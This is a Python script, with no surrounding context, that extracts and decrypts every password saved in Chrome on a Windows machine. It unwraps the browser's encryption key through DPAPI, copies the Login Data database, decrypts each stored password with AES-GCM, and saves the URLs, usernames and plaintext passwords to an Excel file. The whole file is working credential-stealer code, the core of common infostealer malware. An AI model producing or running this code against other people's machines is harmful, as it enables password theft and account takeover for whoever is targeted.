import os
import json
import base64
import sqlite3
import shutil
import win32crypt
from Crypto.Cipher import AES
import pandas as pd

def get_chrome_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(encrypted_password, key):
    try:
        iv = encrypted_password[3:15]
        encrypted_password = encrypted_password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(encrypted_password)[:-16].decode()
    except:
        return "No Passwords"

def fetch_credentials():
    key = get_chrome_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    shutil.copyfile(db_path, "chrome_db_temp.db")
    conn = sqlite3.connect("chrome_db_temp.db")
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")
    
    credentials = []
    for row in cursor.fetchall():
        origin_url, action_url, username, encrypted_password = row
        decrypted_password = decrypt_password(encrypted_password, key)
        credentials.append({
            "Origin URL": origin_url,
            "Action URL": action_url,
            "Username": username,
            "Password": decrypted_password
        })
    
    cursor.close()
    conn.close()
    os.remove("chrome_db_temp.db")
    return credentials

def save_to_excel(credentials):
    df = pd.DataFrame(credentials)
    df.to_excel("chrome_creds.xlsx", index=False)

if __name__ == "__main__":
    credentials = fetch_credentials()
    save_to_excel(credentials)
    print("Credentials have been saved to chrome_creds.xlsx")
